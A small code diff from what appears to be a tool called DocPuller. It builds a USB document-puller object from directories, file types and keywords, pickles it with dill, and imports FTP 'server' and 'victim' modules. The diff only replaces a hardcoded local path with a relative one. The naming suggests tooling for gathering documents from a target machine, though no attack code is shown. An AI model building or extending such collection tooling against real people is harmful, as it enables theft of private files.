@@ -6,7 +6,7 @@ import dill as dill
 from DocPullerScripts.DocPullerFTP.server import Server
 from DocPullerScripts.DocPullerFTP.victim import Victim
 from DocPullerScripts.DocPullerUsb.DocPullerPreformenc import DocPullerUSB
-
+from Generator.DocPullerObjecets import *
 
 class FrozenObjectGeneartor:
 
@@ -27,7 +27,7 @@ class FrozenObjectGeneartor:
         print(self.date)
         obj = DocPullerUSB(self.direcoties, self.file_type, self.keywords, self.date)
 
-        with open(r'C:\Users\ibena\Documents\GitHub\DocPuller\Generator\DocPullerObjecets\frozen_DocPullerUSB.pkl', 'wb') as file:
+        with open(r'DocPullerObjecets\frozen_DocPullerUSB.pkl', 'wb') as file:
             print('opend file')
             dill.dump(obj, file)
 
